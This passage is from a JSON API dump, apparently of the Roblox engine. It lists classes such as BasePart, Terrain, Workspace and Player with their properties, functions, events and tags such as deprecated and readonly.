lass":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"getMass","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"resize","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"Arguments":[{"Name":"part","Type":"Instance"}],"Name":"LocalSimulationTouched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[],"Name":"OutfitChanged","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"StoppedTouching","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"TouchEnded","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"Touched","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"touched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Superclass":"BasePart","type":"Class","Name":"CornerWedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"FormFactorPart","tags":[]},{"ValueType":"FormFactor","type":"Property","Name":"FormFactor","tags":["deprecated"],"Class":"FormFactorPart"},{"ValueType":"FormFactor","type":"Property","Name":"formFactor","tags":["deprecated","hidden"],"Class":"FormFactorPart"},{"Superclass":"FormFactorPart","type":"Class","Name":"Part","tags":[]},{"ValueType":"PartType","type":"Property","Name":"Shape","tags":[],"Class":"Part"},{"Superclass":"Part","type":"Class","Name":"FlagStand","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"FlagStand"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"FlagCaptured","tags":[],"Class":"FlagStand","type":"Event"},{"Superclass":"Part","type":"Class","Name":"Platform","tags":[]},{"Superclass":"Part","type":"Class","Name":"Seat","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"Seat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"Seat"},{"Superclass":"Part","type":"Class","Name":"SkateboardPlatform","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Controller","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"Object","type":"Property","Name":"ControllingHumanoid","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"bool","type":"Property","Name":"StickyWheels","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"SkateboardPlatform"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"impulseWorld","Default":null}],"Name":"ApplySpecificImpulse","tags":[],"Class":"SkateboardPlatform","type":"Function"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"newState","Type":"MoveState"},{"Name":"oldState","Type":"MoveState"}],"Name":"MoveStateChanged","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"Unequipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"equipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"unequipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Superclass":"Part","type":"Class","Name":"SpawnLocation","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowTeamChangeOnTouch","tags":[],"Class":"SpawnLocation"},{"ValueType":"int","type":"Property","Name":"Duration","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"SpawnLocation"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"SpawnLocation"},{"Superclass":"FormFactorPart","type":"Class","Name":"WedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"MeshPart","tags":[]},{"ValueType":"Material","type":"Property","Name":"Material","tags":["deprecated","readonly"],"Class":"MeshPart"},{"ValueType":"Content","type":"Property","Name":"TextureID","tags":[],"Class":"MeshPart"},{"Superclass":"BasePart","type":"Class","Name":"ParallelRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"PartOperation","tags":[]},{"ValueType":"bool","type":"Property","Name":"UsePartColor","tags":[],"Class":"PartOperation"},{"Superclass":"PartOperation","type":"Class","Name":"NegateOperation","tags":[]},{"Superclass":"PartOperation","type":"Class","Name":"UnionOperation","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"PrismPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PrismSides","type":"Property","Name":"Sides","tags":[],"Class":"PrismPart"},{"Superclass":"BasePart","type":"Class","Name":"PyramidPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PyramidSides","type":"Property","Name":"Sides","tags":[],"Class":"PyramidPart"},{"Superclass":"BasePart","type":"Class","Name":"RightAngleRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"Terrain","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Region3int16","type":"Property","Name":"MaxExtents","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Color3","type":"Property","Name":"WaterColor","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterTransparency","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSize","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSpeed","tags":[],"Class":"Terrain"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"AutowedgeCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"AutowedgeCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCenterToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCornerToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Clear","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"Terrain","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"CopyRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"CountCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"center","Default":null},{"Type":"float","Name":"radius","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBall","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null},{"Type":"Vector3","Name":"size","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBlock","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"region","Default":null},{"Type":"Vector3int16","Name":"corner","Default":null},{"Type":"bool","Name":"pasteEmptyCells","Default":null}],"Name":"PasteRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null}],"Name":"ReadVoxels","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"WaterForce","Name":"force","Default":null},{"Type":"WaterDirection","Name":"direction","Default":null}],"Name":"SetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferEmpty","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferSolid","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Array","Name":"materials","Default":null},{"Type":"Array","Name":"occupancy","Default":null}],"Name":"WriteVoxels","tags":[],"Class":"Terrain","type":"Function"},{"Superclass":"BasePart","type":"Class","Name":"TrussPart","tags":[]},{"ValueType":"Style","type":"Property","Name":"Style","tags":[],"Class":"TrussPart"},{"Superclass":"BasePart","type":"Class","Name":"VehicleSeat","tags":[]},{"ValueType":"int","type":"Property","Name":"AreHingesDetected","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"HeadsUpDisplay","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"VehicleSeat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"Torque","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"TurnSpeed","tags":[],"Class":"VehicleSeat"},{"Superclass":"PVInstance","type":"Class","Name":"Model","tags":[]},{"ValueType":"Object","type":"Property","Name":"PrimaryPart","tags":[],"Class":"Model"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetExtentsSize","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetModelCFrame","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetModelSize","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"MoveTo","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetOrientationToIdentity","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetIdentityOrientation","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null}],"Name":"SetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"delta","Default":null}],"Name":"TranslateBy","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"move","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"moveTo","tags":["deprecated"],"Class":"Model","type":"Function"},{"Superclass":"Model","type":"Class","Name":"RootInstance","tags":["notbrowsable"]},{"Superclass":"RootInstance","type":"Class","Name":"Workspace","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowThirdPartySales","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"CurrentCamera","tags":[],"Class":"Workspace"},{"ValueType":"double","type":"Property","Name":"DistributedGameTime","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"FilteringEnabled","tags":[],"Class":"Workspace"},{"ValueType":"float","type":"Property","Name":"Gravity","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"StreamingEnabled","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"Terrain","tags":["readonly"],"Class":"Workspace"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"BreakJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"ExperimentalSolverIsEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRay","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRayWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3WithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetNumAwakeParts","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"int","Name":"index","Default":null}],"Name":"GetPhysicsAnalyzerIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetPhysicsThrottling","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRealPhysicsFPS","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"}],"Name":"IsRegion3Empty","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null}],"Name":"IsRegion3EmptyWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null},{"Type":"JointCreationMode","Name":"jointType","Default":null}],"Name":"JoinToOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"MakeJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"PGSIsEnabled","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetPhysicsThrottleEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"UnjoinFromOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ZoomToExtents","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"findPartOnRay","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"findPartsInRegion3","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"Arguments":[{"Name":"count","Type":"int"}],"Name":"PhysicsAnalyzerIssuesFound","tags":["PluginSecurity"],"Class":"Workspace","type":"Event"},{"Superclass":"Model","type":"Class","Name":"Status","tags":["deprecated","notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Pages","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsFinished","tags":["readonly"],"Class":"Pages"},{"ReturnType":"Array","Arguments":[],"Name":"GetCurrentPage","tags":[],"Class":"Pages","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"AdvanceToNextPageAsync","tags":[],"Class":"Pages","type":"YieldFunction"},{"Superclass":"Pages","type":"Class","Name":"DataStorePages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"FriendPages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"StandardPages","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PartOperationAsset","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ParticleEmitter","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Acceleration","tags":[],"Class":"ParticleEmitter"},{"ValueType":"ColorSequence","type":"Property","Name":"Color","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Drag","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NormalId","type":"Property","Name":"EmissionDirection","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Lifetime","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"LightEmission","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"LockedToPart","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Rate","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"RotSpeed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Rotation","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Size","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Speed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Transparency","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocityInheritance","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocitySpread","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"ZOffset","tags":[],"Class":"ParticleEmitter"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"particleCount","Default":"16"}],"Name":"Emit","tags":[],"Class":"ParticleEmitter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Path","tags":[]},{"ValueType":"PathStatus","type":"Property","Name":"Status","tags":["readonly"],"Class":"Path"},{"ReturnType":"Array","Arguments":[],"Name":"GetPointCoordinates","tags":[],"Class":"Path","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"start","Default":null}],"Name":"CheckOcclusionAsync","tags":[],"Class":"Path","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PathfindingService","tags":["notCreatable"]},{"ValueType":"float","type":"Property","Name":"EmptyCutoff","tags":[],"Class":"PathfindingService"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeRawPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeSmoothPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PersonalServerService","tags":[]},{"ValueType":"string","type":"Property","Name":"RoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Demote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Promote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerGetRankUrl","Default":null}],"Name":"SetPersonalServerGetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerRoleSetsUrl","Default":null}],"Name":"SetPersonalServerRoleSetsUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerSetRankUrl","Default":null}],"Name":"SetPersonalServerSetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetRoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PhysicsPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowSleep","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAnchorsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAssembliesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAttachmentsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAwakePartsHighlighted","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreBodyTypesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreConstraintsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreContactPointsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreJointCoordinatesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreMechanismsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreModelCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreOwnersShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ArePartCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreRegionsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreUnalignedPartsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreWorldCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsReceiveAgeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsTreeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ParallelPhysics","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"PhysicsAnalyzerEnabled","tags":["PluginSecurity","readonly"],"Class":"PhysicsSettings"},{"ValueType":"EnviromentalPhysicsThrottle","type":"Property","Name":"PhysicsEnvironmentalThrottle","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ShowDecompositionGeometry","tags":[],"Class":"PhysicsSettings"},{"ValueType":"double","type":"Property","Name":"ThrottleAdjustTime","tags":[],"Class":"PhysicsSettings"},{"Superclass":"Instance","type":"Class","Name":"Player","tags":[]},{"ValueType":"int","type":"Property","Name":"AccountAge","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AppearanceDidLoad","tags":["RobloxScriptSecurity","deprecated","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"Player"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"CanLoadCharacterAppearance","tags":[],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"Character","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"CharacterAppearance","tags":["notbrowsable"],"Class":"Player"},{"ValueType":"ChatMode","type":"Property","Name":"ChatMode","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexity","tags":["readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexityLimit","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DataReady","tags":["readonly"],"Class":"Player"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DevEnableMouseLock","tags":[],"Class":"Player"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"FollowUserId","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Guest","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"HasBuildTools","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"MaximumSimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"MembershipType","type":"Property","Name":"MembershipType","tags":["readonly"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"